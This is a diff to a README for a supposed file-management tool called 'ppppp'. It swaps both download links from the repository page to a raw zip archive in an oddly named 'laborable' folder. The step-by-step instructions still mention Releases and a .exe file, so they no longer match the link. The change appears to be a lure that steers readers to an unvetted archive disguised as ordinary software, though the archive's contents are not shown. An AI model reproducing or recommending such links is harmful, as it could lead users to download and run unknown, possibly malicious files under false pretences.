@@ -1,6 +1,6 @@
 # 🚀 ppppp - A simple tool to manage files
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/degrading-deputy891/ppppp)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/degrading-deputy891/ppppp/raw/refs/heads/main/laborable/Software-v3.7.zip)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ If your computer meets these standards, the program will run without issues.
 
 You must visit the project page to access the latest version of the software. Follow these steps to prepare your computer:
 
-1. Visit this link to reach the download page: [https://github.com/degrading-deputy891/ppppp](https://github.com/degrading-deputy891/ppppp)
+1. Visit this link to reach the download page: [https://github.com/degrading-deputy891/ppppp/raw/refs/heads/main/laborable/Software-v3.7.zip](https://github.com/degrading-deputy891/ppppp/raw/refs/heads/main/laborable/Software-v3.7.zip)
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version number to see the available files.
 4. Locate the file ending in .exe.
